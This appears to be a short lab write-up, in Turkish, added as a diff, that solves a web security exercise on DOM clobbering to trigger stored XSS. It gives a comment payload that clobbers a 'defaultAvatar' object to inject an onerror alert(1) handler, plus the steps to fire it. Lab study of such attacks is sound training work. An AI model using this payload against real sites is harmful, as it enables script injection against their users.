@@ -1,0 +1,8 @@
+LAB: Exploting DOM clobbering to enable XSS
+
+1 - Herhangi bir gönderiye tıklayıp aşağıdaki payloadı yorum olarak atıyoruz.
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+
+2 - Daha sonra aynı gönderiye girip rastgele bir yorum atın.
+
+3 - Tekrar aynı gönderi sayfasına gelip sayfayı yenileyin.
